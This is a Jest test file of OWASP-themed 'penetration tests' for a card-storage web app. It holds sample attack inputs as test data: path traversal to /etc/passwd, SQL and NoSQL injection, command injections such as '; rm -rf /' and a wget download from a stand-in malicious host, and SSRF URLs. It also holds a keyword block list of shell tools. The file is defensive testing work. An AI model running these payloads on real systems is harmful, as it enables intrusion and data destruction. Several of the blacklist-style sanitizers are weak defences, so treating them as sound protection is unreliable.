/**
 * Security Penetration Tests
 * OWASP Top 10 and ASVS compliance testing
 * 
 * @requirements SEC-01, SEC-02, SEC-03
 * @security OWASP Top 10, ASVS Level 1
 */

const fs = require('fs');
const path = require('path');

describe('Security Penetration Tests', () => {
  
  describe('OWASP A01: Broken Access Control', () => {
    
    test('TC-PEN-001: Should prevent unauthorized file access', () => {
      // Given: Attempt to access restricted files
      const restrictedPaths = [
        '../../etc/passwd',
        '../../../windows/system32/config/sam',
        '/.env',
        '/config/database.yml'
      ];
      
      // When: Validating path access
      const validateFileAccess = (requestedPath) => {
        const normalizedPath = path.normalize(requestedPath);
        const allowedPaths = ['/pwa-card-storage/', '/assets/', '/src/'];
        
        // Check if path is within allowed directories
        return allowedPaths.some(allowedPath => 
          normalizedPath.startsWith(allowedPath) || 
          normalizedPath.startsWith('.' + allowedPath)
        );
      };
      
      // Then: Should deny access to restricted paths
      restrictedPaths.forEach(restrictedPath => {
        expect(validateFileAccess(restrictedPath)).toBe(false);
      });
    });
  });

  describe('OWASP A02: Cryptographic Failures', () => {
    
    test('TC-PEN-002: Should not expose sensitive data in storage', () => {
      // Given: Mock localStorage data
      const mockStorageData = {
        'pwa-language': 'zh',
        'theme-preference': 'dark',
        'user-cards': JSON.stringify([{ name: 'Test User', email: 'test@example.com' }])
      };
      
      // When: Checking for sensitive data exposure
      const sensitivePatterns = [
        /password/i,
        /secret/i,
        /token/i,
        /api[_-]?key/i,
        /private[_-]?key/i
      ];
      
      const exposedData = Object.entries(mockStorageData).filter(([key, value]) => {
        return sensitivePatterns.some(pattern => 
          pattern.test(key) || pattern.test(value)
        );
      });
      
      // Then: Should not expose sensitive data
      expect(exposedData).toHaveLength(0);
    });

    test('TC-PEN-003: Should use secure random generation', () => {
      // Given: Need for random ID generation
      const generateSecureId = () => {
        if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
          const array = new Uint8Array(16);
          crypto.getRandomValues(array);
          return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
        }
        // Fallback for Node.js environment
        return require('crypto').randomBytes(16).toString('hex');
      };
      
      // When: Generating multiple IDs
      const ids = Array.from({ length: 10 }, () => generateSecureId());
      
      // Then: Should generate unique, unpredictable IDs
      const uniqueIds = new Set(ids);
      expect(uniqueIds.size).toBe(10); // All should be unique
      expect(ids[0]).toMatch(/^[0-9a-f]{32}$/); // Should be hex format
    });
  });

  describe('OWASP A03: Injection', () => {
    
    test('TC-PEN-004: Should prevent SQL injection (if applicable)', () => {
      // Given: User input that could contain SQL injection
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'/*",
        "1; DELETE FROM cards WHERE 1=1; --"
      ];
      
      // When: Sanitizing input for database queries
      const sanitizeForQuery = (input) => {
        if (typeof input !== 'string') return '';
        
        // Remove SQL injection patterns
        return input
          .replace(/['";\\]/g, '') // Remove quotes and semicolons
          .replace(/--/g, '') // Remove SQL comments
          .replace(/\/\*/g, '') // Remove block comments
          .replace(/\*\//g, '')
          .replace(/\b(DROP|DELETE|INSERT|UPDATE|SELECT|UNION|ALTER|CREATE)\b/gi, '') // Remove SQL keywords
          .trim();
      };
      
      // Then: Should neutralize SQL injection attempts
      maliciousInputs.forEach(maliciousInput => {
        const sanitized = sanitizeForQuery(maliciousInput);
        expect(sanitized).not.toContain('DROP');
        expect(sanitized).not.toContain('DELETE');
        expect(sanitized).not.toContain("'");
        expect(sanitized).not.toContain(';');
      });
    });

    test('TC-PEN-005: Should prevent NoSQL injection', () => {
      // Given: User input that could contain NoSQL injection
      const maliciousInputs = [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "this.password.match(/.*/)"}',
        '{"$regex": ".*"}'
      ];
      
      // When: Validating input for NoSQL queries
      const validateNoSQLInput = (input) => {
        if (typeof input !== 'string') return false;
        
        // Check for NoSQL injection patterns
        const nosqlPatterns = [
          /\$ne/,
          /\$gt/,
          /\$lt/,
          /\$where/,
          /\$regex/,
          /\$or/,
          /\$and/
        ];
        
        return !nosqlPatterns.some(pattern => pattern.test(input));
      };
      
      // Then: Should reject NoSQL injection attempts
      maliciousInputs.forEach(maliciousInput => {
        expect(validateNoSQLInput(maliciousInput)).toBe(false);
      });
    });

    test('TC-PEN-006: Should prevent command injection', () => {
      // Given: User input that could contain command injection
      const maliciousInputs = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& wget malicious.com/script.sh',
        '`whoami`',
        '$(id)'
      ];
      
      // When: Sanitizing input for system commands
      const sanitizeForCommand = (input) => {
        if (typeof input !== 'string') return '';
        
        // Remove command injection patterns
        return input
          .replace(/[;&|`$()]/g, '') // Remove command separators and execution
          .replace(/\s+(rm|cat|wget|curl|nc|telnet|ssh)\s+/gi, '') // Remove dangerous commands
          .trim();
      };
      
      // Then: Should neutralize command injection attempts
      maliciousInputs.forEach(maliciousInput => {
        const sanitized = sanitizeForCommand(maliciousInput);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$(');
      });
    });
  });

  describe('OWASP A04: Insecure Design', () => {
    
    test('TC-PEN-007: Should implement proper input validation', () => {
      // Given: Various types of user input
      const testInputs = [
        { input: '', expected: false, type: 'empty' },
        { input: 'a'.repeat(1001), expected: false, type: 'too_long' },
        { input: 'valid@example.com', expected: true, type: 'valid_email' },
        { input: 'invalid-email', expected: false, type: 'invalid_email' },
        { input: '123-456-7890', expected: true, type: 'valid_phone' },
        { input: '123', expected: false, type: 'invalid_phone' }
      ];
      
      // When: Validating inputs
      const validateInput = (input, type) => {
        if (!input || typeof input !== 'string') return false;
        if (input.length > 1000) return false;
        
        switch (type) {
          case 'email':
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
          case 'phone':
            return /^\d{3}-\d{3}-\d{4}$/.test(input);
          default:
            return input.trim().length > 0;
        }
      };
      
      // Then: Should validate inputs correctly
      testInputs.forEach(({ input, expected, type }) => {
        const result = validateInput(input, type.replace('valid_', '').replace('invalid_', ''));
        if (type.startsWith('valid_')) {
          expect(result).toBe(expected);
        } else if (type.startsWith('invalid_') || type === 'empty' || type === 'too_long') {
          expect(result).toBe(expected);
        }
      });
    });
  });

  describe('OWASP A05: Security Misconfiguration', () => {
    
    test('TC-PEN-008: Should not expose debug information', () => {
      // Given: Application files
      const filesToCheck = [
        '/Users/shengfanwu/GitHub/DB-Card/pwa-card-storage/index.html',
        '/Users/shengfanwu/GitHub/DB-Card/pwa-card-storage/src/app.js'
      ];
      
      // When: Checking for debug information
      const debugPatterns = [
        /console\.debug/g,
        /debugger;/g,
        /TODO:/g,
        /FIXME:/g,
        /XXX:/g
      ];
      
      const debugInfo = [];
      filesToCheck.forEach(filePath => {
        if (fs.existsSync(filePath)) {
          const content = fs.readFileSync(filePath, 'utf8');
          debugPatterns.forEach(pattern => {
            const matches = content.match(pattern);
            if (matches) {
              debugInfo.push({ file: filePath, pattern: pattern.source, count: matches.length });
            }
          });
        }
      });
      
      // Then: Should minimize debug information in production
      // Note: Some debug info might be acceptable in development
      const criticalDebugInfo = debugInfo.filter(info => 
        info.pattern.includes('debugger') || info.count > 10
      );
      expect(criticalDebugInfo).toHaveLength(0);
    });
  });

  describe('OWASP A06: Vulnerable Components', () => {
    
    test('TC-PEN-009: Should not use known vulnerable patterns', () => {
      // Given: Code files to check
      const filesToCheck = [
        '/Users/shengfanwu/GitHub/DB-Card/pwa-card-storage/src/app.js'
      ];
      
      // When: Checking for vulnerable patterns
      const vulnerablePatterns = [
        /eval\s*\(/g,
        /Function\s*\(/g,
        /innerHTML\s*=/g,
        /document\.write\s*\(/g,
        /setTimeout\s*\(\s*["']/g // setTimeout with string
      ];
      
      const vulnerabilities = [];
      filesToCheck.forEach(filePath => {
        if (fs.existsSync(filePath)) {
          const content = fs.readFileSync(filePath, 'utf8');
          vulnerablePatterns.forEach(pattern => {
            const matches = content.match(pattern);
            if (matches) {
              vulnerabilities.push({ file: filePath, pattern: pattern.source, count: matches.length });
            }
          });
        }
      });
      
      // Then: Should not contain known vulnerable patterns
      expect(vulnerabilities).toHaveLength(0);
    });
  });

  describe('OWASP A07: Identification and Authentication Failures', () => {
    
    test('TC-PEN-010: Should implement secure session management', () => {
      // Given: Session management requirements
      const sessionConfig = {
        httpOnly: true,
        secure: true,
        sameSite: 'strict',
        maxAge: 3600000 // 1 hour
      };
      
      // When: Validating session configuration
      const validateSessionConfig = (config) => {
        return config.httpOnly === true &&
               config.secure === true &&
               config.sameSite === 'strict' &&
               config.maxAge <= 3600000; // Max 1 hour
      };
      
      // Then: Should have secure session configuration
      expect(validateSessionConfig(sessionConfig)).toBe(true);
    });
  });

  describe('OWASP A08: Software and Data Integrity Failures', () => {
    
    test('TC-PEN-011: Should validate data integrity', () => {
      // Given: Data that needs integrity validation
      const testData = {
        name: 'John Doe',
        email: 'john@example.com',
        timestamp: Date.now()
      };
      
      // When: Generating and validating checksum
      const generateChecksum = (data) => {
        const crypto = require('crypto');
        const dataString = JSON.stringify(data);
        return crypto.createHash('sha256').update(dataString).digest('hex');
      };
      
      const originalChecksum = generateChecksum(testData);
      
      // Simulate data modification
      const modifiedData = { ...testData, name: 'Jane Doe' };
      const modifiedChecksum = generateChecksum(modifiedData);
      
      // Then: Should detect data modification
      expect(originalChecksum).not.toBe(modifiedChecksum);
    });
  });

  describe('OWASP A09: Security Logging and Monitoring Failures', () => {
    
    test('TC-PEN-012: Should implement secure logging', () => {
      // Given: Security events to log
      const securityEvents = [
        { type: 'login_attempt', user: 'test@example.com', success: false },
        { type: 'data_access', resource: '/api/cards', user: 'admin' },
        { type: 'permission_denied', action: 'delete_card', user: 'guest' }
      ];
      
      // When: Logging security events
      const secureLog = (event) => {
        const timestamp = new Date().toISOString();
        const sanitizedEvent = {
          timestamp,
          type: event.type,
          user: event.user ? event.user.substring(0, 50) : 'anonymous',
          details: event.success !== undefined ? { success: event.success } : {},
          resource: event.resource || 'unknown',
          action: event.action || 'unknown'
        };
        
        // Remove sensitive information
        delete sanitizedEvent.password;
        delete sanitizedEvent.token;
        delete sanitizedEvent.secret;
        
        return sanitizedEvent;
      };
      
      // Then: Should log events securely
      securityEvents.forEach(event => {
        const loggedEvent = secureLog(event);
        expect(loggedEvent.timestamp).toBeDefined();
        expect(loggedEvent.type).toBe(event.type);
        expect(loggedEvent).not.toHaveProperty('password');
        expect(loggedEvent).not.toHaveProperty('token');
      });
    });
  });

  describe('OWASP A10: Server-Side Request Forgery (SSRF)', () => {
    
    test('TC-PEN-013: Should validate external URLs', () => {
      // Given: URLs that could be used for SSRF attacks
      const maliciousUrls = [
        'http://localhost:22',
        'http://127.0.0.1:3306',
        'http://169.254.169.254/latest/meta-data/',
        'file:///etc/passwd',
        'ftp://internal.server.com'
      ];
      
      // When: Validating URLs
      const validateUrl = (url) => {
        try {
          const parsedUrl = new URL(url);
          
          // Block local/private addresses
          const hostname = parsedUrl.hostname;
          if (hostname === 'localhost' || 
              hostname === '127.0.0.1' ||
              hostname.startsWith('192.168.') ||
              hostname.startsWith('10.') ||
              hostname.startsWith('172.') ||
              hostname === '169.254.169.254') {
            return false;
          }
          
          // Only allow HTTP/HTTPS
          if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
            return false;
          }
          
          return true;
        } catch (e) {
          return false;
        }
      };
      
      // Then: Should reject malicious URLs
      maliciousUrls.forEach(maliciousUrl => {
        expect(validateUrl(maliciousUrl)).toBe(false);
      });
    });
  });
});